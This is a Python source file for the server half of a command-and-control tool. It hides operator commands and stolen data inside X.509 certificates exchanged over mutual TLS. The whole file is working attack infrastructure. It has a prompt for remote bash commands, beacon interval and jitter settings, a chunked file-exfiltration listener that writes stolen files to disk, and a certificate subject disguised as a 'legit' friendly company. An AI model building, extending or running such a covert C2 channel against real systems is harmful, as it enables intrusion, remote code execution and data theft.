import time
import asyncio
import socket
import ssl
from pathlib import Path
from cryptography import x509
from codetiming import Timer
from cert_gen import gen_msg_cert, get_cert_msg, init_cert_gen, Colors

timer = Timer(name="class")
last_time = 0.0

# dictionary of open file handles used during data exfiltration
file_handles = {}


def get_file_handle(file_path):
    """ Open a file for data exfil and return the handle """
    global file_handles
    if file_path in file_handles:
        handle = file_handles[file_path]
    else:
        # create new handle
        handle = open(file_path, "wb")
        file_handles[file_path] = handle
    return handle


def close_file_handle(file_name):
    """ Close the open file handle and remove from dictionary """
    if file_name in file_handles:
        file_handles[file_name].close()
        file_handles.pop(file_name)


async def dump_exfil_data(cert, output_dir):
    """ Write exfiltration data to file """
    global timer, last_time
    """
    msg format: is_first|is_last|len_of_data_chuck|file_name
    """
    msg, msg_data = await get_cert_msg(cert, bytes_2_text=False)
    transfer_state, chuck_len, file_name = msg.split("|")
    transfer_state = int(transfer_state)
    chuck_len = int(chuck_len)
    if transfer_state == 1:
        timer.start()
    get_file_handle(f"{output_dir}/{file_name}").write(msg_data)

    # write bytes per second
    this_time = time.perf_counter() - timer._start_time
    bytes_per_sec = chuck_len / (this_time - last_time)
    print(f"{Colors.LIGHT_CYAN}Writing {len(msg_data)} bytes of {file_name} ({bytes_per_sec} bytes/second){Colors.ENDC}")
    last_time = this_time

    if transfer_state == 3:
        close_file_handle(file_name)
        timer.stop()
        print(f"{Colors.LIGHT_CYAN}Finished writing file {file_name}{Colors.ENDC}")
    return transfer_state


async def do_exfil(listen_addr, listen_port, ca_cert_path, cmd_cert, output_dir):
    """ Create a socket for data exfiltration of a multipart file. This function
    loops through the client cert messages until the file is fully exfiltrated.
    """
    Path(output_dir).mkdir(parents=True, exist_ok=True)
    msg_cert, msg_key = cmd_cert
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((listen_addr, listen_port))
    server_socket.listen(10)

    download_state = 0
    while download_state < 3:
        client, fromaddr = server_socket.accept()
        secure_sock = ssl.wrap_socket(
            client, server_side=True, ca_certs=ca_cert_path, certfile=msg_cert,
            keyfile=msg_key, cert_reqs=ssl.CERT_REQUIRED,
            ssl_version=ssl.PROTOCOL_TLSv1_2)
        cert = secure_sock.getpeercert(binary_form=True)
        cert = x509.load_der_x509_certificate(cert)
        # write data blob
        download_state = await dump_exfil_data(cert, output_dir)
        # send msg back
        # data = secure_sock.read(1024)
        # secure_sock.write(data)
        secure_sock.close()
    server_socket.close()


async def listen_for_client(listen_addr, listen_port, ca_cert_path, cmd_cert):
    """ Create a socket with the next command for the client """
    print(f"{Colors.LIGHT_CYAN}Creating server side socket{Colors.ENDC}")
    msg_cert, msg_key = cmd_cert
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((listen_addr, listen_port))
        server_socket.listen(10)
        client, fromaddr = server_socket.accept()
        with ssl.wrap_socket(
            client, server_side=True, ca_certs=ca_cert_path, certfile=msg_cert,
            keyfile=msg_key, cert_reqs=ssl.CERT_REQUIRED,
            ssl_version=ssl.PROTOCOL_TLSv1_2) as secure_sock:
            cert = secure_sock.getpeercert(binary_form=True)
            cert = x509.load_der_x509_certificate(cert)
            # get client msg
            msg, data = await get_cert_msg(cert)
            # send msg back
            # data = secure_sock.read(1024)
            # secure_sock.write(data)
    print(f"{Colors.LIGHT_CYAN}Tearing down server side socket{Colors.ENDC}")
    return msg, data


async def start_server(listen_addr, listen_port, cert_root_path, ca_cert_path, ca_key_path, passphrase, subject, beacon_interval, beacon_jitter, output_dir):
    gen_cert_path = f"{cert_root_path}/srv_certs"
    ca_key, ca_cert = await init_cert_gen(gen_cert_path, ca_cert_path, ca_key_path, passphrase)

    # beacon interval and jitter
    wait_cmd = ("wait", f"{beacon_interval},{beacon_jitter}")
    # used when there are no commands in the queue
    noop_cmd = ("noop", None)
    # command Q
    # commands = [
    #     # "bash|ls", wait_cmd, "exfil|super_valuable_files/hacker_small.jpg"
    #     ("bash", "pwd"),
    #     ("bash", "ls"),
    #     ("bash", "ls,certs"),
    #     ("bash", "ls,certs/ca_certs")
    # ]

    # pre-create the wait msg cert
    wait_cmd_cert = await gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg=wait_cmd[0], data=wait_cmd[1])
    keep_running = True
    while keep_running:
        # listen for a client REQUEST
        cmd, data = await get_next_cmd()
        # if len(commands) > 0:
        #     cmd, data = commands.pop(0)
        # else:
        #     cmd, data = noop_cmd
        # print(f"next client command: '{cmd}: {data}'")
        cmd_cert = await gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg=cmd, data=data)
        client_msg, client_data = await listen_for_client(listen_addr, listen_port, ca_cert_path, cmd_cert)
        assert client_msg == "beacon" and client_data is None
        if cmd == "kill":
            # client shut itself down, so shut the server down too
            keep_running = False
        elif cmd == "exfil":
            # exfil sets up a special loop to pull down file chunks
            await do_exfil(listen_addr, listen_port, ca_cert_path, cmd_cert, output_dir)
        else:
            # listen for a client RESPONSE
            client_msg, client_data = await listen_for_client(listen_addr, listen_port, ca_cert_path, wait_cmd_cert)
            assert client_msg == "response"
            if client_data:
                client_data = client_data.strip().split("\n")
                print(f"\n{Colors.LIGHT_YELLOW}client response:{Colors.ENDC}")
                for line in client_data:
                    print(f"{Colors.LIGHT_YELLOW}\t{line}{Colors.ENDC}")
    print(f"{Colors.RED}SHUTTING DOWN{Colors.ENDC}")


async def get_next_cmd():
    cmd_type = None
    cmd_data = None
    print()
    while cmd_data is None:
        cmd_type = input(f"{Colors.LIGHT_GREEN}Enter a command type ('bash', 'exfil', 'kill'): {Colors.ENDC}").strip()
        if cmd_type == "bash":
            cmd_data = input(f"{Colors.LIGHT_GREEN}Enter the bash command: {Colors.ENDC}").strip()
        elif cmd_type == "wait":
            interval = input(f"{Colors.LIGHT_GREEN}Enter beacon interval: {Colors.ENDC}").strip()
            jitter = input(f"{Colors.LIGHT_GREEN}Enter beacon jitter: {Colors.ENDC}").strip()
            cmd_data = f"{interval},{jitter}"
        elif cmd_type == "exfil":
            cmd_data = input(f"{Colors.LIGHT_GREEN}Enter file path: {Colors.ENDC}").strip()
        elif cmd_type == "kill":
            cmd_data = "kill"
        else:
            print(f"{Colors.RED}Invalid command type, please try again{Colors.ENDC}")
    print()
    return cmd_type, cmd_data


def main():
    listen_addr = '127.0.0.1'
    listen_port = 8089
    passphrase = b'hackerman'
    cert_root_path = "certs/"
    ca_cert = f"{cert_root_path}/ca_certs/hmCA.pem"
    ca_key = f"{cert_root_path}/ca_certs/hmCA.key"
    output_dir = "server_out/"
    subject = {
        "C": "US",
        "ST": "Washington",
        "L": "Seattle",
        "O": "Friendly Company LLC",
        "CN": "legit.friendly.company.com",
    }
    beacon_interval = 5
    beacon_jitter = 30
    asyncio.run(start_server(listen_addr, listen_port,
                 cert_root_path, ca_cert, ca_key, passphrase,
                 subject, beacon_interval, beacon_jitter, output_dir))


if __name__ == '__main__':
    main()
